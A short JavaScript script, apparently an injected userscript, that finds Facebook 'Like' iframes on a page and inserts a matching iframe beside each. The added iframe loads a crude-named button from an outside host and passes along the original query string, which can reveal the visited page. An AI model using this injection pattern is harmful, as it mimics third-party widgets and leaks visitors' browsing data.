var max_repeat = 10;
var current_find_iteration = 0;
var button_url = 'http://d1.pkt3.com:10010/fuckthat';
var found_iframes = new Object;

find_facebook_like_frames();

function find_facebook_like_frames() {
    for (var i=0; i < document.getElementsByTagName('iframe').length; i++) {
    	var iframe = document.getElementsByTagName('iframe')[i];
	    if (iframe.src.match(/facebook.com\/plugins\/like\.php/)) {
            if (!found_iframes[iframe.src]) {
                found_iframes[iframe.src] = true; 
                fuck_that_parent(iframe);
            }
        }
	}
    if (current_find_iteration++ < max_repeat) {
	    setTimeout("find_facebook_like_frames()", 100);
    }
}

function fuck_that_parent(iframe) {
    var fucker = document.createElement('iframe');
	for (i in iframe) {
		fucker.style[i] = iframe.style[i];
	}
	fucker.frameBorder = 0;
	fucker.scrolling = 'no';
	fucker.align = iframe.align;
	fucker.marginHeight = iframe.marginHeight;
	fucker.marginWidth = iframe.marginWidth;
    var query = iframe.src.match(/\?.*/);
    fucker.src = button_url + query[0];
	//console.log("------------------------------------------------------------------------");
    //console.log(fucker.src);
	//console.log("------------------------------------------------------------------------");
    iframe.parentNode.insertBefore(fucker, iframe.nextSibling);
}
